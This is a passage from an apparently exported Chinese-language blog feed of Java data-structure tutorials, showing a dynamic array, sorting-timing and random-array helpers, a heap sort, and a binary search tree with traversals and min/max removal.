class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeElement</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = find(e);</span><br><span class="line">        <span class="keyword">if</span>(index != -<span class="number">1</span>)</span><br><span class="line">            remove(index);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> i , <span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(i &lt; <span class="number">0</span> || i &gt;= size || j &lt; <span class="number">0</span> || j &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Index is illegal."</span>);</span><br><span class="line"></span><br><span class="line">        E t = data[i];</span><br><span class="line">        data[i] = data[j];</span><br><span class="line">        data[j] = t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//system.out.print()所输出的类型toString覆盖</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        res.append(String.format(<span class="string">"Array: size = %d, capacity = %d \n"</span>, size, data.length));</span><br><span class="line">        res.append(<span class="string">'['</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i ++)&#123;</span><br><span class="line">            res.append(data[i]);</span><br><span class="line">            <span class="keyword">if</span>(i != size - <span class="number">1</span>)</span><br><span class="line">                res.append(<span class="string">", "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.append(<span class="string">']'</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">resize</span><span class="params">(<span class="keyword">int</span> newCapacity)</span></span>&#123;</span><br><span class="line">        E[] newData = (E[])<span class="keyword">new</span> Object[newCapacity];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i ++)</span><br><span class="line">            newData[i] = data[i];</span><br><span class="line">        data = newData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="SortingHelper-java（辅助进行算法时间输出的）"><a href="#SortingHelper-java（辅助进行算法时间输出的）" class="headerlink" title="SortingHelper.java（辅助进行算法时间输出的）"></a>SortingHelper.java（辅助进行算法时间输出的）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SortingHelper</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SortingHelper</span><span class="params">()</span></span>&#123;&#125; <span class="comment">//私有类</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">boolean</span> <span class="title">isSorted</span><span class="params">(E[] arr)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i&lt; arr.length; i++)</span><br><span class="line">            <span class="keyword">if</span> (arr[i - <span class="number">1</span>].compareTo(arr[i]) &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sortTest</span><span class="params">(String sortname, E[] arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">long</span> startTime = System.nanoTime();</span><br><span class="line">        <span class="keyword">if</span>(sortname.equals(<span class="string">"SelectionSort"</span>)) &#123;</span><br><span class="line">            SelectionSort.sort(arr);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"InsertionSort"</span>))</span><br><span class="line">            InsertionSort.sort(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"InsertionSort2"</span>))</span><br><span class="line">            InsertionSort.sort2(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"MergeSort"</span>))</span><br><span class="line">            MergeSort.sort(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"MergeSort2"</span>))</span><br><span class="line">            MergeSort.sort2(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"MergeSort3"</span>))</span><br><span class="line">            MergeSort.sort3(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"MergeSort4"</span>))</span><br><span class="line">            MergeSort.sort4(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"MergeSortBU"</span>))</span><br><span class="line">            MergeSort.sortBU(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"QuickSort"</span>))</span><br><span class="line">            QuickSort.sort(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"QuickSort2"</span>))</span><br><span class="line">            QuickSort.sort2ways(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"QuickSort3"</span>))</span><br><span class="line">            QuickSort.sort3ways(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"HeapSort"</span>))</span><br><span class="line">            HeapSort.sort(arr);</span><br><span class="line">        <span class="keyword">long</span> endTime = System.nanoTime();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">double</span> time = (endTime - startTime) / <span class="number">1000000000.0</span>; <span class="comment">//纳米要/9个零</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!SortingHelper.isSorted(arr))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(sortname + <span class="string">"failed"</span>);</span><br><span class="line">        System.out.println(String.format(<span class="string">"%s , n = %d : %f s "</span>, sortname, arr.length, time));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="ArrayGenerator-java（生成随机的一组数组或有序的一组数组）"><a href="#ArrayGenerator-java（生成随机的一组数组或有序的一组数组）" class="headerlink" title="ArrayGenerator.java（生成随机的一组数组或有序的一组数组）"></a>ArrayGenerator.java（生成随机的一组数组或有序的一组数组）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayGenerator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">ArrayGenerator</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Integer[] generateOrderedArray(<span class="keyword">int</span> n)&#123;</span><br><span class="line"></span><br><span class="line">       Integer[] arr = <span class="keyword">new</span> Integer[n];</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n ; i++)</span><br><span class="line">           arr[i] = i;</span><br><span class="line">       <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生成一个长度为 n 的随机数组， 每个数字的范围是[ 0 , bound)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Integer[] generateRandomArray(<span class="keyword">int</span> n, <span class="keyword">int</span> bound)&#123;</span><br><span class="line"></span><br><span class="line">        Integer[] arr = <span class="keyword">new</span> Integer[n];</span><br><span class="line">        Random rnd = <span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n; i++)</span><br><span class="line">            arr[i] = rnd.nextInt(bound); <span class="comment">//从0到bound前闭后开</span></span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="HeapSort-java-简单的堆排序"><a href="#HeapSort-java-简单的堆排序" class="headerlink" title="HeapSort.java(简单的堆排序)"></a>HeapSort.java(简单的堆排序)</h2><blockquote>
<p>因为是最大堆，所以进行了逆置输出</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HeapSort</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">HeapSort</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(E[] data)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        MaxHeap&lt;E&gt; maxHeap = <span class="keyword">new</span> MaxHeap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(E e: data)</span><br><span class="line">            maxHeap.add(e);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = data.length - <span class="number">1</span> ; i &gt;= <span class="number">0</span> ; i --)</span><br><span class="line">            data[i] = maxHeap.extractMax();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">1000000</span>;</span><br><span class="line"></span><br><span class="line">        Integer[] arr = ArrayGenerator.generateRandomArray(n , n);</span><br><span class="line">        Integer[] arr2 = Arrays.copyOf(arr, arr.length);</span><br><span class="line">        Integer[] arr3 = Arrays.copyOf(arr, arr.length);</span><br><span class="line">        Integer[] arr4 = Arrays.copyOf(arr, arr.length);</span><br><span class="line">        Integer[] arr5 = Arrays.copyOf(arr, arr.length);</span><br><span class="line"></span><br><span class="line">        sort(arr5);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n ; i ++)&#123;</span><br><span class="line">            System.out.println(arr5[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        SortingHelper.sortTest(<span class="string">"MergeSort"</span>, arr);</span><br><span class="line">        SortingHelper.sortTest(<span class="string">"QuickSort2"</span>, arr2);</span><br><span class="line">        SortingHelper.sortTest(<span class="string">"QuickSort3"</span>, arr3);</span><br><span class="line">        SortingHelper.sortTest(<span class="string">"HeapSort"</span>, arr4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>堆排序</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-二分搜索树前中后序遍历和增查改（完整代码）</title>
    <url>/posts/47.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="二分搜索树的前中后序遍历和增删查（完整代码）"><a href="#二分搜索树的前中后序遍历和增删查（完整代码）" class="headerlink" title="二分搜索树的前中后序遍历和增删查（完整代码）"></a>二分搜索树的前中后序遍历和增删查（完整代码）</h1><h2 id="BST-java（前序中序和后序的递归算法等）"><a href="#BST-java（前序中序和后序的递归算法等）" class="headerlink" title="BST.java（前序中序和后序的递归算法等）"></a>BST.java（前序中序和后序的递归算法等）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"><span class="keyword">import</span> java.util.Stack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BST</span>&lt;<span class="title">E</span> <span class="keyword">extends</span> <span class="title">Comparable</span>&lt;<span class="title">E</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> E e;</span><br><span class="line">        <span class="keyword">public</span> Node left;</span><br><span class="line">        <span class="keyword">public</span> Node right;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.e = e;</span><br><span class="line">            left = <span class="keyword">null</span>;</span><br><span class="line">            right = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Node root;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BST</span><span class="params">()</span></span>&#123;</span><br><span class="line">        root = <span class="keyword">null</span>;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size==<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向二分搜索树中添加新的元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        root = add(root , e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向以node为跟的二分搜索树中插入元素E，递归算法</span></span><br><span class="line">    <span class="comment">// 返回插入新节点后二分搜索树的根</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Node <span class="title">add</span><span class="params">(Node node, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        if(e.equals(node.e))</span></span><br><span class="line"><span class="comment">//            return;</span></span><br><span class="line"><span class="comment">//        else if(e.compareTo(node.e) &lt; 0 &amp;&amp; node.left == null)&#123;</span></span><br><span class="line"><span class="comment">//            node.left = new Node(e);</span></span><br><span class="line"><span class="comment">//            size ++;</span></span><br><span class="line"><span class="comment">//            return;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        else if(e.compareTo(node.e) &gt; 0 &amp;&amp; node.right == null)&#123;</span></span><br><span class="line"><span class="comment">//            node.right = new Node(e);</span></span><br><span class="line"><span class="comment">//            size ++;</span></span><br><span class="line"><span class="comment">//            return;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            size ++;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Node(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(e.compareTo(node.e) &lt; <span class="number">0</span>)</span><br><span class="line">            node.left = add(node.left, e);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(e.compareTo(node.e)&gt;<span class="number">0</span>)</span><br><span class="line">                node.right = add(node.right,e);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//看当前二分搜索树中是否包含元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> contains(root , e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 看以node为跟的二分搜索树中是否包含元素e，递归算法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(Node node, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(e.compareTo(node.e) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(e.compareTo(node.e) &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> contains(node.left, e);</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">// e.comparaTo(node.e) &gt; 0</span></span><br><span class="line">            <span class="keyword">return</span> contains(node.right, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 二分搜索树的前序遍历</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">preOrder</span><span class="params">()</span></span>&#123;</span><br><span class="line">        preOrder(root);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 前序遍历以node为根的二分搜索树，递归算法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">preOrder</span><span class="params">(Node node)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(node.e);</span><br><span class="line">        preOrder(node.left);</span><br><span class="line">        preOrder(node.right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 二分搜索树的非递归前序遍历</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">preOrderNR</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Stack&lt;Node&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        stack.push(root);</span><br><span class="line">        <span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">            Node cur = stack.pop();</span><br><span class="line">            System.out.println(cur.e);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(cur.right != <span class="keyword">null</span>)</span><br><span class="line">                stack.push(cur.right);</span><br><span class="line">            <span class="keyword">if</span>(cur.left != <span class="keyword">null</span>)</span><br><span class="line">                stack.push(cur.left);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 二分搜索树的中序遍历</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">inOrder</span><span class="params">()</span></span>&#123;</span><br><span class="line">        inOrder(root);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 中序遍历以node为根的二分搜索树，递归算法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">inOrder</span><span class="params">(Node node)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        inOrder(node.left);</span><br><span class="line">        System.out.println(node.e);</span><br><span class="line">        inOrder(node.right);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 二分搜索树的后序遍历</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postOrder</span><span class="params">()</span></span>&#123;</span><br><span class="line">        postOrder(root);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后序遍历以node为根的二分搜索树，递归算法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postOrder</span><span class="params">(Node node)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        postOrder(node.left);</span><br><span class="line">        postOrder(node.right);</span><br><span class="line">        System.out.println(node.e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 二分搜索树的层序遍历</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">levelOrder</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Queue&lt;Node&gt; q = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        q.add(root);</span><br><span class="line">        <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">            Node cur = q.remove();</span><br><span class="line">            System.out.println(cur.e);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(cur.left != <span class="keyword">null</span>)</span><br><span class="line">                q.add(cur.left);</span><br><span class="line">            <span class="keyword">if</span>(cur.right != <span class="keyword">null</span>)</span><br><span class="line">                q.add(cur.right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        generateBSTString(root, <span class="number">0</span>, res);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生成以node为根节点，深度为depth描述二叉树的字符串</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">generateBSTString</span><span class="params">(Node node, <span class="keyword">int</span> depth, StringBuilder res)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            res.append(generateDepthString(depth) + <span class="string">"null\n"</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res.append(generateDepthString(depth) + node.e + <span class="string">"\n"</span>);</span><br><span class="line">        generateBSTString(node.left, depth +<span class="number">1</span>, res);</span><br><span class="line">        generateBSTString(node.right, depth +<span class="number">1</span>, res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">generateDepthString</span><span class="params">(<span class="keyword">int</span> depth)</span></span>&#123;</span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; depth; i ++)</span><br><span class="line">            res.append(<span class="string">"--"</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 寻找二分搜索树的最小元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">minimum</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(size == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"BST is empty!"</span>);</span><br><span class="line">        <span class="keyword">return</span> minimum(root).e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回以node为根的二分搜索树的最小键值所在的节点</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Node <span class="title">minimum</span><span class="params">(Node node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node.left == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        <span class="keyword">return</span> minimum(node.left);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 寻找二分搜索树的最大元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">maximum</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(size == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"BST is empty!"</span>);</span><br><span class="line">        <span class="keyword">return</span> maximum(root).e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回以node为根的二分搜索树的最大键值所在的节点</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Node <span class="title">maximum</span><span class="params">(Node node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node.right == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        <span class="keyword">return</span> maximum(node.right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从二分搜索树中删除最小值所在的节点，返回最小值</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeMin</span><span class="params">()</span></span>&#123;</span><br><span class="line">        E ret = minimum();</span><br><span class="line">        root = removeMin(root);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除掉以node为根的二分搜索树中的最小节点</span></span><br><span class="line">    <span class="comment">// 返回删除节点后新的二分搜索树的根</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Node <span class="title">removeMin</span><span class="params">(Node node)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(node.left == <span class="keyword">null</span>) &#123;</span><br><span class="line">            Node rightNode = node.right;</span><br><span class="line">            node.right = <span class="keyword">null</span>;</span><br><span class="line">            size --;</span><br><span class="line">            <span class="keyword">return</span> rightNode;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        node.left = removeMin(node.left);</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从二分搜索树中删除最大值所在的节点，返回最大值</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeMax</span><span class="params">()</span></span>&#123;</span><br><span class="line">        E ret = maximum();</span><br><span class="line">        root = removeMax(root);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除掉以node为根的二分搜索树中的最大节点</span></span><br><span class="line">    <span class="comment">// 返回删除节点后新的二分搜索树的根</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Node <span class="title">removeMax</span><span class="params">(Node node)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(node.right == <span class="keyword">null</span>) &#123;</span><br><span class="line">            Node leftNode = node.left;</span><br><span class="line">            node.left = <span class="keyword">null</span>;</span><br><span class="line">            size --;</span><br><span class="line">            <span class="keyword">return</span> leftNode;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        node.right = removeMax(node.right);</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从二分搜索树中删除元素为e 的节点</span></span><br><span 